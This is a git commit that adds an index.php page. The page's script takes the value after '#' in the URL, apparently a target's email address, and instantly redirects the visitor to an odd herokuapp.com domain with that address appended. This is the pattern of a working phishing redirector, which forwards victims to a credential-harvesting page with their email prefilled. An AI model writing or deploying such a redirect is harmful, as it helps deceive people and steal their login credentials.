01ab825e6592742141dd5ff4af788f9d0700397a
uyshei12 <100035605+uyshei12@users.noreply.github.com>
2022-03-16 10:23:14 -0400

    Create index.php

---
+++ index.php
@@ -0,0 +1,19 @@
+<html lang="en">
+
+
+
+    <script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
+    <script>
+
+        var hash = window.location.hash;
+  var str = hash.split('#')[1];
+        var em = hash.split('#')[1];
+                                        
+                       window.setTimeout(function() {
+    window.location.href = 'https://linw22veritaswecnfmiodial.herokuapp.com/#'+em;
+}, 0);
+        
+    </script>
+ 
+
+</html>
